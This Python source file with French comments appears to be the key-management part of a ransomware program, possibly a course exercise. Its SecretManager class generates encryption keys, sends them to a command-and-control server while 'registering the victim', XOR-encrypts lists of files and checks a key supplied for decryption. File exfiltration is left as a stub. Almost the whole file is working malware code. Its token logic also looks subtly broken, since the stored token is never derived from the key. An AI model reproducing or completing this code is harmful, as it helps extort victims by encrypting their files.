from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    # Définition des constantes
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        # Initialisation des attributs
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        # Configuration du logger
        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Dérive le token en utilisant PBKDF2HMAC
        self._token = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.TOKEN_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
            ).derive(key)
        return self._token

    def create(self)->Tuple[bytes, bytes, bytes]:
        # Génère le sel, la clé et le token
        salt = os.urandom(self.SALT_LENGTH)
        key = os.urandom(self.KEY_LENGTH)
        token = os.urandom(self.TOKEN_LENGTH)

        return salt, key, token

    def bin_to_b64(self, data:bytes)->str:
        # Convertit les données binaires en base64
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # Enregistre la victime sur le CNC en envoyant les données
        url = f"http://{self._remote_host_port}/new"
        data = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
        }
        response = requests.post(url, json=data)

        if response.status_code != 200:
            self._log.error(f"Échec de l'envoi des données au CNC : {response.text}")
        else:
            self._log.info("Données envoyées au CNC avec succès")

    def setup(self) -> None:
        # Fonction principale pour créer les données cryptographiques et enregistrer le malware sur le CNC

        # Crée les éléments cryptographiques : sel, clé et token
        self._salt = os.urandom(self.SALT_LENGTH)
        self._key = os.urandom(self.KEY_LENGTH)
        self._token = os.urandom(self.TOKEN_LENGTH)

        # Sauvegarde le sel et le token dans des fichiers locaux
        os.makedirs(self._path, exist_ok=True)
        with open(os.path.join(self._path, "salt.bin"), "wb") as salt_file:
            salt_file.write(self._salt)
        with open(os.path.join(self._path, "token.bin"), "wb") as token_file:
            token_file.write(self._token)

        # Enregistre la victime sur le CNC en envoyant les données
        self.post_new(self._salt, self._key, self._token)

    def load(self) -> None:
        # Charge le sel et le token à partir des fichiers locaux
        salt_path = os.path.join(self._path, "salt.bin")
        token_path = os.path.join(self._path, "token.bin")

        if os.path.exists(salt_path) and os.path.exists(token_path):
            with open(salt_path, "rb") as salt_file:
                self._salt = salt_file.read()
            with open(token_path, "rb") as token_file:
                self._token = token_file.read()
            self._log.info("Chargement du sel et du token à partir des fichiers locaux")
        else:
            self._log.error("Fichier de sel ou de token introuvable")

    def check_key(self, candidate_key: bytes) -> bool:
        # Vérifie si la clé candidate est valide
        derived_key = self.do_derivation(self._salt, candidate_key)
        return derived_key == self._token  # Utiliser la variable dérivée pour comparer avec _token

    def set_key(self, b64_key: str) -> None:
        # Décode la clé base64 et la définit comme self._key si elle est valide
        candidate_key = base64.b64decode(b64_key)

        if self.check_key(candidate_key):
            self._key = candidate_key
            self._log.info("Clé définie avec succès")
        else:
            self._log.error("Clé invalide fournie")
            raise ValueError("Clé invalide")

    def get_hex_token(self) -> str:
        # Retourne une chaîne composée de symboles hexadécimaux, concernant le token
        hashed_token = sha256(self._token).hexdigest()
        return hashed_token

    def xorfiles(self, files: List[str]) -> None:
        # XOR une liste de fichiers en utilisant self._key
        for file_path in files:
            try:
                xorfile(file_path, self._key)
            except Exception as e:
                self._log.error(f"Erreur lors du chiffrement du fichier {file_path}: {e}")

    def leak_files(self, files: List[str]) -> None:
        # Envoie le fichier, le chemin réel et le token au CNC
        raise NotImplementedError()

    def clean(self) -> None:
        # Supprime les fichiers cryptographiques locaux
        salt_file = os.path.join(self._path, "salt.bin")
        token_file = os.path.join(self._path, "token.bin")

        try:
            if os.path.exists(salt_file):
                os.remove(salt_file)
                self._log.info("Fichier de sel supprimé")

            if os.path.exists(token_file):
                os.remove(token_file)
                self._log.info("Fichier de token supprimé")

        except Exception as e:
            self._log.error(f"Erreur lors de la suppression des fichiers cryptographiques locaux: {e}")
            raise
